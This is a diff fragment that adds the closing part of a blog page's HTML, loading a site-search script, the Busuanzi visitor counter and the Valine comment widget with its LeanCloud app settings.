+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: 'vg2JvVf64bbR6Par3qNkPdkF-gzGzoHsz',
+    appKey: 'rBAaVih6OPFtP6Q08SUVtV5l',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+</html>
